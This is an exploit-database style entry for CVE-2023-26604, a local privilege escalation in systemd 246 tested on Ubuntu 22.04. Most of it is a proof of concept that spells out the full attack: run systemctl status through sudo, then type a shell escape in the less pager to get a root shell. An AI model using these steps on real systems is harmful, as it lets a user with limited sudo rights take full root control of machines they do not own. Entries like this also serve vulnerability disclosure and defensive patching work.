# Exploit Title: systemd 246 - Local Privilege Escalation
# Exploit Author: Iyaad Luqman K (init_6)
# Application: systemd 246
# Tested on: Ubuntu 22.04
# CVE: CVE-2023-26604

systemd 246 was discovered to contain Privilege Escalation vulnerability, when the `systemctl status` command can be run as root user.
This vulnerability allows a local attacker to gain root privileges.

## Proof Of Concept:
1. Run the systemctl command which can be run as root user.

sudo /usr/bin/systemctl status any_service

2. The ouput is opened in a pager (less) which allows us to execute arbitrary commands.

3. Type in `!/bin/sh` in the pager to spawn a shell as root user.
